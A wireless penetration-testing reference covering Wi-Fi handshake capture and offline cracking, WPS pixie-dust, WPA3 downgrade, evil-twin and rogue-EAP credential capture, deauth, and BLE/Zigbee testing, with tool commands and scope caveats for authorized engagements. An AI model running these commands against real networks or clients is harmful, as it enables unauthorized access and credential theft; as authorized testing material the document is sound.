# Wireless attack reference (Wi-Fi + short-range RF)
# Approval-gated. AUTHORIZED networks/devices only. NO deauth against production. Cracking is OFFLINE.
# REDACT recovered PSKs/PINs/credentials in artifacts. In-scope SSIDs/locations only; don't touch neighbours.

## Survey (passive first)
```
airmon-ng start wlan0                              # monitor mode -> wlan0mon
airodump-ng wlan0mon                               # list SSIDs/BSSIDs/channels/clients in range
bettercap -iface wlan0mon                          # wifi.recon on; map in-scope BSSIDs + associated clients
```
Confirm every BSSID is in RF scope before any active step. Note the band/channel, protocol (WPA2/WPA3/WPS),
and whether client isolation is on.

## WPA2-PSK: handshake capture + offline crack  (the core vector)
Capture the 4-way handshake (or a PMKID) passively; crack OFFLINE. Prefer passive capture; only use a
forced re-association against an APPROVED test client, never production.
```
# PMKID / handshake capture (no client deauth needed for PMKID):
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 capture.pcapng       # convert to hashcat 22000 format
# Classic handshake (aircrack path):
airodump-ng -c <ch> --bssid <BSSID> -w cap wlan0mon
# Offline crack (OFFLINE only):
hashcat -m 22000 hash.hc22000 wordlist.txt         # WPA-PBKDF2-PMKID+EAPOL
aircrack-ng -w wordlist.txt cap-01.cap             # alternative cracker
```
Benign proof: the PSK is recovered offline for a TEST SSID. Redact it.

## WPA3-SAE: transition/downgrade + handshake weaknesses
- WPA3 "transition mode" advertises WPA2 alongside WPA3 for compatibility → a client can be driven onto the
  WPA2 path (capture + crack as above). Test whether the in-scope network runs transition mode.
- The SAE handshake has known side-channel and resource-exhaustion weaknesses: timing/cache
  side-channels during password derivation can leak information about the password, and malformed-commit
  handling can exhaust the AP. Assess AWARENESS/applicability; do not run resource-exhaustion against prod.
Benign proof: show transition-mode is on (downgrade feasible) and/or document SAE side-channel applicability.

## WPS pixie-dust  (offline PIN recovery)
If WPS is enabled, a weak/predictable nonce lets the PIN be recovered offline from a single exchange.
```
wash -i wlan0mon                                   # list WPS-enabled APs (in scope only)
reaver -i wlan0mon -b <BSSID> -K 1 -vv             # pixie-dust mode
bully -b <BSSID> -c <ch> -d wlan0mon               # alternative
```
Benign proof: the WPS PIN (and thus PSK) is recovered. Rate-limit; stop if it disrupts the AP.

## Evil-twin / rogue-AP + captive-portal credential capture
Stand up a look-alike AP for a TEST client to demonstrate association + credential submission.
```
hostapd rogue.conf                                 # broadcast the test SSID on an isolated interface
# captive portal / automated rogue-AP + phishing portal:
wifiphisher                                        # select a scenario; serves a credential-capture page
```
Scope it to a TEST client and benign test credentials; do NOT deauth real clients to drive them over.
Benign proof: the TEST client associated and submitted a benign test credential to the portal. Tear down after.

## WPA-Enterprise: rogue EAP endpoint + credential capture
Against PEAP/EAP without server-certificate validation, a rogue RADIUS/AP endpoint captures the client's
MSCHAPv2 challenge/response for offline cracking.
```
hostapd-wpe wpe.conf                               # rogue AP + RADIUS; logs EAP identities + challenge/response
hashcat -m 5500 captured_netntlm ...               # crack the captured MSCHAPv2 offline
```
Use a benign test identity. The finding is "clients don't validate the server cert" → creds capturable.

## Deauth / disassociation  (AWARENESS — approval only, never on prod)
Deauthentication frames can force clients to reconnect (to recapture a handshake or drive an evil-twin).
This is DISRUPTIVE: **only against an approved, isolated test client, never production**, and never as a
denial-of-service demo. Prefer passive capture or PMKID so deauth is unnecessary.

## Short-range RF (overview — in refs for scoping)
- BLE: enumerate GATT services/characteristics, look for unauthenticated read/write of sensitive values,
  passive sniffing of pairing. Tools: `gatttool`, `bleah`, a BLE sniffer. Benign: read/toggle a non-safety
  characteristic on an authorized device.
- Zigbee: enumerate the PAN, inspect key provisioning (default/transported keys), capture joins. Tool:
  `killerbee` suite. Benign: show a weak/default network-key provisioning on an authorized device.

## Reporting
Each finding: network/device, protocol, the vector, the benign proof (redacted secret), attacker
preconditions (RF proximity, test-client cooperation), and remediation (strong PSK, disable WPS, disable
transition mode, enforce server-cert validation / 802.1X with EAP-TLS, client isolation).
